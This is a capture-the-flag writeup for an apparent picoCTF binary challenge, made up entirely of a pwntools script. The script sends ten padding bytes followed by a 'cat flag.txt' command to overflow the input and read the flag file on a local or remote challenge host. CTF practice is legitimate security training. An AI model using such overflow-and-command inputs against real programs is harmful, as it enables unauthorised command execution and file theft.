#Writeup

'''
#!python3
from pwn import *

elf = context.binary = exe = ELF('./ii1', checksec=False)

remote_connection = "nc amiable-citadel.picoctf.net 65020".split()


def start():
    if args.REMOTE:
        return remote(remote_connection[1], int(remote_connection[2]))
    else:
        return process(exe.path)

p = start()
p.recvuntil(b'name?\n')
p.sendline(b'A'*10 + b'cat flag.txt\n')
p.interactive()
'''
